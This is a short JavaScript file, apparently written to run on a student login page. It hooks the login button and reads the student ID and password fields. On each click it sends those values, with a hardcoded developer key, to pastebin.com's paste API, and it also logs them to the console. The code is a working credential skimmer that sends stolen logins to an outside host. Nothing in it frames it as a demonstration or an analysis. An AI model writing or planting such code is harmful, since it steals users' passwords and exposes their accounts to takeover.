const loginButton = document.querySelector('.loginButton');
const studentId = document.querySelector('[name="studentIDNumber"]');
const password = document.querySelector('[name="password"]');
const pastebinkey = 'gzYBWUddEgEyCwKo6T5dOTs80ta9TgDa';

console.log('OK!');
console.log(loginButton);
console.log(studentId);
console.log(password);

loginButton.addEventListener('click', () => {
    console.log('click');

    if (studentId && password) {
        console.log(studentId.value);
        console.log(password.value);

        const data = {
            username: studentId.value,
            password: password.value,
        };

        const bodyParam = new URLSearchParams({
            api_option: 'paste',
            api_dev_key: pastebinkey,
            api_paste_code: JSON.stringify(data),
        });

        const requestData = {
            method: 'POST',
            mode: 'no-cors',
            body: bodyParam,
        };

        console.log(JSON.stringify(data), bodyParam);

        fetch('http://pastebin.com/api/api_post.php', requestData)
            .then((response) => console.log(response))
            .catch((err) => console.error(err));
    }
});
